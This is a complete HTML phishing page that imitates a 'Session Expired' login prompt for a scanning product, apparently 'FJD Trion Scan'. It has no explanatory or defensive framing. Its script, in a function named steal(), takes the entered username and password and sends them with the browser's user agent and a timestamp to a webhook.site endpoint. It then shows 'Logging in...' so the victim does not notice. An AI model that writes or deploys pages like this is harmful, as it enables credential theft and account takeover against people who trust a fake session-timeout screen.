<!DOCTYPE html>
<html>
<head><title>FJD Trion Scan</title></head>
<body style="background:#fff;font-family:Arial;padding:40px;text-align:center;">

  <h2 style="color:#d32f2f;">⚠️ Session Expired</h2>
  <p>Please login again to continue scanning</p>

  <input id="user" type="text"     placeholder="Username / Email"
    style="display:block;width:100%;padding:12px;margin:10px 0;font-size:16px;border:1px solid #ccc;border-radius:4px;">

  <input id="pass" type="password" placeholder="Password"
    style="display:block;width:100%;padding:12px;margin:10px 0;font-size:16px;border:1px solid #ccc;border-radius:4px;">

  <button onclick="steal()"
    style="width:100%;padding:14px;background:#1976d2;color:#fff;font-size:16px;border:none;border-radius:4px;cursor:pointer;">
    Login
  </button>

  <p id="msg" style="color:red;"></p>

  <script>
    function steal() {
      var user = document.getElementById('user').value;
      var pass = document.getElementById('pass').value;

      if (!user || !pass) {
        document.getElementById('msg').innerText = 'Please fill all fields';
        return;
      }

      // Send to webhook
      fetch('https://webhook.site/YOUR-ID-HERE', {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          username:  user,
          password:  pass,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });

      document.getElementById('msg').innerText = 'Logging in...';
    }
  </script>
</body>
</html>
